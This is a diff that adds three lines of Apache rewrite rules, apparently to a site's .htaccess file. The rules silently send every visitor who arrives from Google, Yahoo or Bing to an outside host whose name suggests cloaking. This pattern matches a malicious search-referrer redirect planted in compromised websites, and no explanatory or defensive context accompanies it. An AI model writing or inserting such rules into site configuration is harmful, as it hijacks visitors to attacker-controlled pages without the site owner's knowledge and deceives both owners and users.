@@ -1,0 +1,3 @@
+RewriteEngine On
+RewriteCond %{HTTP_REFERER} (google|yahoo|bing) [NC]
+RewriteRule ^(.*)$ https://cloak-ht.example.com/ [R=302,L]
